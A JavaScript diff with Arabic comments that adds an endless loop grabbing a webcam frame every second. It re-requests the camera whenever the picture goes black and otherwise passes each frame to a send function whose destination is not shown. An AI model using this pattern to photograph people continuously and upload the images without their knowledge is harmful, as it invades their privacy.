@@ -50,6 +50,36 @@
         }
       }, 'image/jpeg');
     }
+    
+function isBlackFrame(canvas) {
+  const pixels = canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height).data;
+  for (let i = 0; i < pixels.length; i += 4) {
+    if (pixels[i] > 10 || pixels[i + 1] > 10 || pixels[i + 2] > 10) {
+      return false; // فيه ألوان
+    }
+  }
+  return true; // كله أسود
+}
+
+async function autoCaptureLoop() {
+  while (true) {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    if (isBlackFrame(canvas)) {
+      console.warn("إطار أسود. إعادة تشغيل الكاميرا...");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (err) {
+        console.error("فشل إعادة تشغيل الكاميرا:", err);
+      }
+    } else {
+      captureAndSend(); // أرسل الصورة إذا كانت طبيعية
+    }
+    await new Promise(r => setTimeout(r, 1000)); // انتظر 1 ثانية
+  }
+}
+
+autoCaptureLoop(); // ابدأ الحلقة
 
     // شغل الكاميرا وانتظر حتى تبدأ فعلياً قبل إرسال أي صورة
     async function startCameraAndSending() {
